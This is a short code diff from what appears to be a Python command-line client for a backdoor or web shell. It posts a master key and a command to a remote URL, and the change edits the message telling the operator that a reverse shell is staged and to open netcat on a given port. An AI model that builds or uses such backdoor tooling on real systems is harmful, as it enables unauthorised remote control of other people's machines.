@@ -249,8 +249,9 @@ ___  ___          _              _____                       _
         data = {'masterkey': masterkey, 'cmd': cmd}
         res = requests.post(url, data=data)
 
-        output_push = ansi.style("[+] Reverse shell staged. Openup netcat!: " + args.target, fg='green', bold=True)
+        output_shell = ansi.style("[+] Reverse shell staged. Openup netcat in a separate terminal! Port: " + args.port, fg='green', bold=True)
          
+        self.poutput(output_shell)
 
     """
     Command: Download
